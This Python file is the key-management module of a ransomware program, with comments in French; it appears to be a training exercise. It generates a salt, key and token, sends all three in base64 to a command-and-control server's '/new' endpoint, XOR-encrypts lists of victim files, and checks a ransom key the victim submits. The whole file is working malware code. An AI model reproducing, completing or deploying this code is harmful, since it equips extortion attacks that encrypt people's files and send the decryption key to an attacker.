from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Génération du token par cryptographie sur la clé et le salt entrée en paramètre
        token = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION
        ).derive(key)
        
        return token


    def create(self)->Tuple[bytes, bytes, bytes]:
        """
        Génère les urandom cryptographique pour salt, key et token

        Returns:
            Tuple[bytes, bytes, bytes]: tuple des trois urandom en bytes
        """
        salt = os.urandom(self.SALT_LENGTH)
        key = os.urandom(self.KEY_LENGTH)
        token = os.urandom(self.TOKEN_LENGTH)
        return (salt, key, token)


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        """
        Envoie du dictionnaire vers le CNC

        Args:
            salt(bytes)
            key(bytes)
            token(bytes)
        """
        url = f"http://{self._remote_host_port}/new"
        to_send = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        # Request post effectuer avec la librairie requests
        response = requests.post(url, json=to_send)
        if response.status_code != 200:
            self._log.error(f"Data sending to CNC failed : {response.text}")
        else:
            self._log.info("Data sending to CNC successed")     

    def setup(self)->None:
        """
        Génère le dossier de stockage du chiffrement et l'envoie aussi sur le cnc

        Raises:
            FileExistsError: Vérifie la présence d'un token déjà existant
        """
        # main function to create crypto data and register malware to cnc
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
            raise FileExistsError("File already exists")

        # Création du sel, de la clé et du token
        self._salt, self._key, self._token = self.create()

        # Création du dossier de chiffrement
        os.makedirs(self._path, exist_ok=True)
        with open(os.path.join(self._path, "salt.bin"), "wb") as file_salt:
            file_salt.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
            file_token.write(self._token)
        
        # Appel de la fonction post pour envoyer les données au cnc
        self.post_new(self._salt, self._key, self._token)

    def load(self)->None:
        """
        Permet de lire le sel et le token
        """
        # function to load crypto data
        path_salt = os.path.join(self._path, "salt.bin")
        path_token = os.path.join(self._path, "token.bin")

        # Vérification de la présence des données à charger
        if os.path.exists(path_salt) and os.path.exists(path_token):
            with open(path_salt, "rb") as file_salt:
                self._salt = file_salt.read()
            with open(path_token, "rb") as file_token:
                self._token = file_token.read()
        else:
            self._log.info("Missing crypted data")

    def check_key(self, candidate_key:bytes)->bool:
        """
        Effectue une dérivation avec la clé candidate pour la comparer a la dérivation original

        Args:
            candidate_key (bytes): clé proposé par la victime

        Returns:
            bool: True si les deux dérivations sont concordantes
        """
        # Assert the key is valid
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token


    def set_key(self, b64_key:str)->None:
        """
        Vérifie la validité de la clé

        Args:
            b64_key (str): la clé reçue en base64

        Raises:
            ValueError: Clé invalide
        """
        # If the key is valid, set the self._key var for decrypting
        key_to_try = base64.b64decode(b64_key)
        if self.check_key(key_to_try):
            self._key = key_to_try
            self._log.info("Correct key")
        else:
            raise ValueError("Wrong key")

    def get_hex_token(self)->str:
        """
        Permet d'afficher le token

        Returns:
            str: le token
        """
        # Should return a string composed of hex symbole, regarding the token
        hash_token = sha256(self._token).hexdigest()
        return hash_token

    def xorfiles(self, files:List[str])->None:
        """
        Effectue un xorfile() sur chaque fichier avec la clé

        Args:
            files (List[str]): liste des fichiers à chiffrer
        """
        # xor a list for file
        for f_path in files:
            try:
                xorfile(f_path, self._key)
                self._log.info(f"Successfully cryptation of {f_path}")
            except Exception as e:
                self._log.error(f"Crypting error {f_path}: {e}")

    def clean(self):
        """
        Supprime les éléments cryptographiques en local
        """
        # remove crypto data from the target
        self._salt = None
        self._key = None
        self._token = None
        
        path_salt = os.path.join(self._path, "salt.bin")
        path_token = os.path.join(self._path, "token.bin")
 
        # Suppression des fichiers sel et token
        if os.path.exists(path_salt):
            os.remove(path_salt) 
            self._log.info("Fichier de sel supprimé")
        else:
            self._log.info("Fichier de sel inexistant")
        if os.path.exists(path_token):
            os.remove(path_token)
            self._log.info("Fichier de jeton supprimé")
        else:
            self._log.info("Fichier de jeton inexistant")
